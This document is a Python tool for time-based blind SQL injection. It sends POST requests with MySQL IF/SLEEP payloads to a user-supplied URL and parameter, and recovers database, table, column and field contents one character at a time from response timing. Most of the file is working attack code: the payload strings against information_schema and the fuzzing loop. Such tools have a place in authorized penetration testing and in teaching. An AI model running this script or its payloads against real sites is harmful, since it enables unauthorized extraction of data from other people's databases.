from timeit import default_timer as timer
import requests
import argparse

parser = argparse.ArgumentParser(description='blind sql injection', usage='Script options',epilog='''
	To change the output of the columns, you need to edit the first digit in the string "limit 0,1" (0 for the first column).
	If you set "limit 1,1", u see second column. Similarly for tables and values in the database.
	To ennumerate, unlock the corresponding row with # in code.
	''')

parser.add_argument('-u', type=str, help='Enter URL', )
parser.add_argument('-param', type=str, help='Data string to be sent through POST (e.g. "id","name", etc...)')

args = parser.parse_args()
length_result = 30																# Response length
dictionary = [32] + list(range(48, 58)) + list(range(95, 126))					# ASCII symbols

def greetings():

	print('''
\t\t\t░█▀▄░█░░░▀█▀░█▀█░█▀▄░░░█▀▀░▄▀▄░█░░░▀█▀
\t\t\t░█▀▄░█░░░░█░░█░█░█░█░░░▀▀█░█\█░█░░░░█░
\t\t\t░▀▀░░▀▀▀░▀▀▀░▀░▀░▀▀░░░░▀▀▀░░▀\░▀▀▀░▀▀▀
\n\n''')

'''
	USE PROXY FOR BURPSUITE TO DEBUG

proxies = {
   'http': 'http://127.0.0.1:8080',
   'https': 'http://127.0.0.1:8080',
}

'''

def blind_sql():
	answer_lst=[]

	# P.S.
	#	To change the output of the columns, you need to edit the first digit in the string "limit 0,1" (0 for the first column).
	#	If you set "limit 1,1", u see second column. Similarly for tables and values in the database.
	
	#	To ennumerate, unlock the corresponding row.

	# P.S.S
	#	You can change the delay time and response time in line with payload and "if time > your_value"

	#payload = "' or IF(ASCII(substring((SELECT database()), INDEX, 1))>FUZZ,sleep(0.1),1) -- -"																						# DATABASES
	#payload = ("' or IF(ASCII(substring((SELECT table_name FROM information_schema.tables WHERE table_schema = 'YOUR_DB_NAME' limit 0,1 ), INDEX, 1))>FUZZ,sleep(0.1),1) -- -")		# TABLES
	#payload = "' or IF(ASCII(substring((SELECT column_name FROM information_schema.columns WHERE table_name = 'YOUR_TABLE_NAME' limit 0,1 ), INDEX, 1))>FUZZ,sleep(0.1),1) -- -"		# COLUMNS
	#payload = "' or IF(ASCII(substring((SELECT YOUR_CLOLUMN_NAME FROM YOUR_TABLE_NAME limit 0,1 ), INDEX, 1))>FUZZ,sleep(0.1),1) -- -"													# VALUE
	
	i = 1

	while (i <= length_result):

		for char in dictionary:
			start_time = timer()
			new_payload = payload.replace("INDEX",str(i)).replace("FUZZ",str(char))
			response = requests.post(args.u, data={args.param: new_payload})
			end_time = timer()
			time = end_time-start_time

			if time > 0.5: 
				continue

			print(chr(char), end='', flush=True)
			answer_lst.append(chr(char))
			i += 1
			break

	print(f"\nAsnwer is: {''.join(answer_lst)}")
				

if __name__ == "__main__":
	greetings()
	blind_sql()